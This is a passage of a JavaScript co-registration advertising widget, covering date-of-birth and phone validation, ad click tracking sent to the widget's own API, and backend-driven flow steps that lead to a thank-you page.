      const datePattern = /^(0[1-9]|1[0-2])\/(0[1-9]|[12][0-9]|3[01])\/[0-9]{4}$/;
      if (!datePattern.test(dateStr)) {
        return false;
      }
      
      const parts = dateStr.split('/');
      const month = parseInt(parts[0], 10);
      const day = parseInt(parts[1], 10);
      const year = parseInt(parts[2], 10);
      
      // Check if date is valid
      const date = new Date(year, month - 1, day);
      if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
        return false;
      }
      
      // Check if person is at least 13 years old
      const today = new Date();
      const minDate = new Date(today.getFullYear() - 13, today.getMonth(), today.getDate());
      if (date > minDate) {
        return false;
      }
      
      // Check if date is not too far in the past (120 years)
      const maxDate = new Date(today.getFullYear() - 120, today.getMonth(), today.getDate());
      if (date < maxDate) {
        return false;
      }
      
      return true;
    }

    validatePhoneNumber(phoneStr) {
      const phonePattern = /^\([0-9]{3}\) [0-9]{3}-[0-9]{4}$/;
      return phonePattern.test(phoneStr);
    }

    getDeviceType() {
      const width = window.innerWidth;
      if (width < 768) return 'mobile';
      if (width < 1024) return 'tablet';
      return 'desktop';
    }

    async clickAd(url) {
      if (this.currentCampaign) {
        // Generate click ID for tracking
        const clickId = this.generateClickId();
        
        // Track click
        try {
          await fetch(`${this.apiBase}/api/clicks`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: this.sessionId,
              campaignId: this.currentCampaign.id,
              clickId: clickId,
              url: url
            })
          });
          
          console.log('🖱️ CLICK TRACKED:', {
            campaignId: this.currentCampaign.id,
            campaignName: this.currentCampaign.name,
            clickId: clickId,
            sessionId: this.sessionId
          });
        } catch (error) {
          console.error('CoReg: Error tracking click:', error);
        }

        // Open URL
        window.open(url, '_blank');
      }
      
      // Continue to next step after short delay
      setTimeout(() => {
        console.log('Ad clicked, checking for next action...');
        this.continueFlow();
      }, 1000);
    }

    generateClickId() {
      // Generate a unique click ID
      return 'ck_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
    }

    skipAd() {
      console.log('Ad skipped, checking for next action...');
      // Continue to next step in flow
      this.continueFlow();
    }

    async continueFlow() {
      try {
        // Check with backend for next action
        const response = await fetch(`${this.apiBase}/api/flow/next-action`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: this.sessionId,
            siteCode: this.siteCode,
            action: 'ad_completed' // Indicate we just completed an ad
          })
        });

        const flowResult = await response.json();
        console.log('Flow result:', flowResult);

        if (flowResult.action === 'ad') {
          // Show another ad
          console.log('Showing next ad...');
          this.showAd();
        } else if (flowResult.action === 'complete') {
          // Flow is complete
          console.log('Flow complete, showing thank you');
          this.showThankYou();
        } else if (flowResult.action === 'email_capture') {
          // Should not happen after questions, treat as complete
          console.log('Unexpected email_capture after ads, showing thank you');
          this.showThankYou();
        } else {
          // Fallback to thank you
          console.log('Unknown action:', flowResult.action, 'showing thank you');
          this.showThankYou();
        }
      } catch (error) {
        console.error('Error continuing flow:', error);
        // Fallback to thank you page
        this.showThankYou();
      }
    }

    getUserState() {
      // In a real implementation, you might use IP geolocation
      return 'CA'; // Default for demo
    }
  }

  // Make CoRegWidget available globally
  window.CoRegWidget = CoRegWidget;
  
  // Initialize widget only if not being used as a library
  if (!window.location.search.includes('session=')) {
    window.coregWidget = new CoRegWidget();
  }
})();